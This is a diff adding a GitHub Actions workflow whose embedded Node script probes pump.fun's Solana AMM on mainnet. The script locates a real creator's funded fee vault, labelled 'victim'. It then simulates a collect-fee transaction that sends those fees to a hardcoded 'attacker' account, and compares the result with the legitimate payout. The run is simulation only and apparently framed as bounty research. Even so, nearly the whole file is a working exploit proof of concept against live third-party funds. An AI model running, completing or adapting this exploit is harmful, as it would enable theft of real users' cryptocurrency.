@@ -1,0 +1,47 @@
+name: creator-fee-destination-binding-sim
+on:
+  push:
+    branches: [audit/boost-runtime-probe-20260815]
+    paths: ['.github/workflows/creator-fee-destination-binding-sim.yml']
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  simulate:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 12
+    steps:
+      - uses: actions/checkout@v4
+        with: {ref: audit/boost-runtime-probe-20260815}
+      - uses: actions/setup-node@v4
+        with: {node-version: 24}
+      - run: npm install --no-save @pump-fun/pump-swap-sdk@1.19.0 @solana/web3.js @solana/spl-token bs58
+      - name: Locate funded vault and test destination authority binding
+        shell: bash
+        run: |
+          cat > creator_binding.mjs <<'NODE'
+          import fs from 'node:fs';import bs58pkg from 'bs58';
+          import {PublicKey,Transaction} from '@solana/web3.js';
+          import {NATIVE_MINT,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID,getAssociatedTokenAddressSync,createAssociatedTokenAccountIdempotentInstruction} from '@solana/spl-token';
+          import {PUMP_AMM_PROGRAM_ID,OFFLINE_PUMP_AMM_PROGRAM,coinCreatorVaultAuthorityPda,coinCreatorVaultAtaPda} from '@pump-fun/pump-swap-sdk';
+          const bs58=bs58pkg.default??bs58pkg;const attacker=new PublicKey('HTVZVEQMBsNanubDPTs3CxDAEGNFQHJY8c1441iy2S5r');
+          const RPCS=['https://api.mainnet-beta.solana.com','https://rpc.solanatracker.io/public','https://solana-rpc.publicnode.com','https://solana.public-rpc.com'];let id=1;
+          const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+          async function one(u,m,p,n=4){let e;for(let a=0;a<n;a++){try{const r=await fetch(u,{method:'POST',headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-simulation-only/1.0'},body:JSON.stringify({jsonrpc:'2.0',id:id++,method:m,params:p})});if(r.status===429||r.status>=500){e=new Error('HTTP '+r.status);await sleep(500+600*a);continue}const x=await r.json();if(x.error){e=new Error(JSON.stringify(x.error));if(/No response|429|Too many/i.test(String(e))){await sleep(500+600*a);continue}throw e}return x.result}catch(x){e=x;await sleep(500+600*a)}}throw e}
+          async function call(m,p){let e;for(const u of RPCS){try{return await one(u,m,p)}catch(x){e=x;console.log('RPC_FAIL',m,u,String(x).slice(0,180))}}throw e}
+          async function sim(raw,addresses,label){let e;for(const u of RPCS){try{console.log(label,'SIM_TRY',u);const x=await one(u,'simulateTransaction',[raw.toString('base64'),{encoding:'base64',sigVerify:false,replaceRecentBlockhash:true,commitment:'confirmed',accounts:{encoding:'base64',addresses}}],3);console.log(label,'SIM_RPC',u);return x.value}catch(x){e=x;console.log(label,'SIM_FAIL',u,String(x).slice(0,220))}}throw e}
+          const idl=JSON.parse(fs.readFileSync('node_modules/@pump-fun/pump-swap-sdk/src/idl/pump_amm.json','utf8'));const disc58=bs58.encode(Buffer.from(idl.accounts.find(x=>x.name.toLowerCase()==='pool').discriminator));
+          const rows=await call('getProgramAccounts',[PUMP_AMM_PROGRAM_ID.toBase58(),{commitment:'confirmed',encoding:'base64',filters:[{dataSize:300},{memcmp:{offset:0,bytes:disc58}},{memcmp:{offset:75,bytes:NATIVE_MINT.toBase58()}}],dataSlice:{offset:211,length:32}}]);
+          const zero=PublicKey.default.toBase58(),uniq=[];const seen=new Set();for(const r of rows??[]){const d=Buffer.from(r.account.data[0],'base64');if(d.length!==32)continue;const c=bs58.encode(d);if(c===zero||seen.has(c))continue;seen.add(c);uniq.push(c)}
+          console.log('WSOL_POOLS',rows.length,'UNIQUE_NONZERO_CREATORS',uniq.length);
+          let victim=null;
+          for(let i=0;i<Math.min(uniq.length,12000)&&!victim;i+=100){const cs=uniq.slice(i,i+100);const vs=cs.map(c=>{const cp=new PublicKey(c),auth=coinCreatorVaultAuthorityPda(cp),ata=coinCreatorVaultAtaPda(auth,NATIVE_MINT,TOKEN_PROGRAM_ID);return{creator:cp,auth,ata}});let rr=null,last;for(const u of RPCS){try{rr=await one(u,'getMultipleAccounts',[vs.map(x=>x.ata.toBase58()),{encoding:'base64',commitment:'confirmed',dataSlice:{offset:64,length:8}}]);break}catch(e){last=e}}if(!rr)throw last;for(let k=0;k<vs.length;k++){const a=rr.value[k];if(!a)continue;const d=Buffer.from(a.data[0],'base64');if(d.length<8)continue;const amt=d.readBigUInt64LE(0);if(amt>=100000n){victim={...vs[k],amount:amt};break}}if(i%1000===0)console.log('SEARCHED',i+cs.length,'FOUND',!!victim);await sleep(100)}
+          if(!victim)throw new Error('No funded creator vault >=100000 lamports in first 12000 creators');
+          console.log('VICTIM',JSON.stringify({creator:victim.creator.toBase58(),vaultAuthority:victim.auth.toBase58(),vaultAta:victim.ata.toBase58(),amount:victim.amount.toString(),sol:Number(victim.amount)/1e9},null,2));
+          const legitDest=getAssociatedTokenAddressSync(NATIVE_MINT,victim.creator,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID);const attackDest=getAssociatedTokenAddressSync(NATIVE_MINT,attacker,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID);
+          async function makeCollect(dest){return await OFFLINE_PUMP_AMM_PROGRAM.methods.collectCoinCreatorFee().accountsPartial({quoteMint:NATIVE_MINT,quoteTokenProgram:TOKEN_PROGRAM_ID,coinCreator:victim.creator,coinCreatorTokenAccount:dest}).instruction()}
+          const collectLegit=await makeCollect(legitDest),collectAttack=await makeCollect(attackDest);console.log('COLLECT_KEYS',collectAttack.keys.map((k,i)=>({i,pubkey:k.pubkey.toBase58(),w:k.isWritable,s:k.isSigner})));
+          async function run(label,dest,collect){const create=createAssociatedTokenAccountIdempotentInstruction(attacker,dest,label==='LEGIT'?victim.creator:attacker,NATIVE_MINT,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID);const bh=(await call('getLatestBlockhash',[{commitment:'confirmed'}])).value;const tx=new Transaction({feePayer:attacker,recentBlockhash:bh.blockhash}).add(create,collect);const raw=tx.serialize({requireAllSignatures:false,verifySignatures:false});console.log(label,'RAW_BYTES',raw.length,'DEST',dest.toBase58(),'SIGS',tx.signatures.map(x=>x.publicKey.toBase58()));const addresses=[victim.ata.toBase58(),dest.toBase58()];const v=await sim(raw,addresses,label);const post=v.accounts??[];const amt=r=>r&&Buffer.from(r.data[0],'base64').length>=72?Buffer.from(r.data[0],'base64').readBigUInt64LE(64).toString():null;const text=(v.logs??[]).join('\n');const out={label,simulationOnly:true,broadcast:false,err:v.err,units:v.unitsConsumed,collectReached:text.includes('Instruction: CollectCoinCreatorFee'),vaultPost:amt(post[0]),destPost:amt(post[1]),constraintOwner:/ConstraintTokenOwner|token owner|owner constraint/i.test(text),logs:v.logs??[]};console.log(label,'RESULT',JSON.stringify({...out,logs:undefined},null,2));console.log(label,'LOGS_BEGIN');for(const l of v.logs??[])console.log(l);console.log(label,'LOGS_END');return out}
+          const legit=await run('LEGIT',legitDest,collectLegit);const attack=await run('ATTACK',attackDest,collectAttack);console.log('DIFFERENTIAL',JSON.stringify({victim:{creator:victim.creator.toBase58(),vault:victim.ata.toBase58(),amount:victim.amount.toString()},legit:{err:legit.err,vaultPost:legit.vaultPost,destPost:legit.destPost},attack:{err:attack.err,vaultPost:attack.vaultPost,destPost:attack.destPost}},null,2));
+          NODE
+          node creator_binding.mjs
